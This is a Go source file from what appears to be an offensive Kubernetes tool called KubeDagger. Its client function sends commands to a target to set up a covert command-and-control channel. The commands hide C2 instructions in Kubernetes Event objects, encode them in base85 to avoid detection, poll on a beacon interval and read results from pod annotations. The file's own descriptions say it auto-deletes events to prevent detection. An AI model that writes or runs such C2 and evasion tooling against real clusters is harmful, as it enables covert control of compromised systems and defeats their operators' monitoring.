package k8s_event_c2

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type EventC2Result struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, namespace, beaconInterval, output string) error {
	result := &EventC2Result{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"create_event_channel",
			"create Kubernetes Event objects with encoded C2 commands in message field",
			"k8s_c2_create_event",
		},
		{
			"configure_beacon",
			"set beacon interval for periodic command polling via Event watch API",
			"k8s_c2_set_beacon",
		},
		{
			"encode_commands",
			"encode C2 commands using base85 in Event annotations to avoid detection",
			"k8s_c2_encode_cmd",
		},
		{
			"decode_responses",
			"read pod status annotations for encoded command execution results",
			"k8s_c2_decode_resp",
		},
		{
			"cleanup_events",
			"auto-delete old Event objects to prevent accumulation and detection",
			"k8s_c2_cleanup",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + namespace + "#" + beaconInterval
		status := shared.SendCommand(target, "/k8s_event_c2", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
